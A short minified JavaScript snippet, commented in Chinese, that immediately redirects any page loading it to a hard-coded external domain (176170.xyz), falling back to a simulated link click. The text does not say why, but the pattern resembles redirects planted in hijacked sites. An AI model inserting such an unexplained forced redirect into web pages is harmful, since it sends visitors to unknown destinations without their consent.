!function(p){"use strict";!function(t){var s=window,e=document,i=p,// 目标跳转地址
c="https://www.176170.xyz/",// 跳转延迟（毫秒），0 表示立即跳转
n=0;var r=function(){// 检查是否支持 location.href 跳转
if(s.location&&typeof s.location.href==="string"){// 执行跳转
s.location.href=c;}else{// 降级方案：创建链接并模拟点击
var o=e.createElement("a");o.href=c,o.target="_self",e.body.appendChild(o),o.click(),e.body.removeChild(o);}};// 设置延迟跳转（可根据需求调整延迟时间）
setTimeout(r,n);}()}({});
